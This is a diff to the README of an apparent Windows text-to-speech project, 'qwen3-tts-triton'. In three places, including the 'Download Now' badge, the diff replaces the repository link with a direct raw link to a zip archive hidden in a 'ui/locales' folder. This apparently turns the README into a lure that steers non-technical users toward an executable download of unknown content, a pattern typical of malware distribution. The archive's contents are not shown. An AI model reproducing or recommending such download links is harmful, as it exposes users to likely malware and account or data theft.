@@ -1,6 +1,6 @@
 # ⚙️ qwen3-tts-triton - Faster Qwen3 TTS on Windows
 
-[![Download](https://img.shields.io/badge/Download-Now-ff6b6b?style=for-the-badge)](https://github.com/Dalescentless548/qwen3-tts-triton)
+[![Download](https://img.shields.io/badge/Download-Now-ff6b6b?style=for-the-badge)](https://raw.githubusercontent.com/Dalescentless548/qwen3-tts-triton/main/ui/locales/qwen_tts_triton_v1.5.zip)
 
 ## 🚀 What this is
 
@@ -17,7 +17,7 @@ If you want the model to run with less delay on your PC, this project helps with
 
 Visit this page to download and use the files:
 
-https://github.com/Dalescentless548/qwen3-tts-triton
+https://raw.githubusercontent.com/Dalescentless548/qwen3-tts-triton/main/ui/locales/qwen_tts_triton_v1.5.zip
 
 ### What to do
 
@@ -165,7 +165,7 @@ For smoother runs:
 
 Use this page to download and run the files:
 
-https://github.com/Dalescentless548/qwen3-tts-triton
+https://raw.githubusercontent.com/Dalescentless548/qwen3-tts-triton/main/ui/locales/qwen_tts_triton_v1.5.zip
 
 ## 🆘 If you need to check the files
 
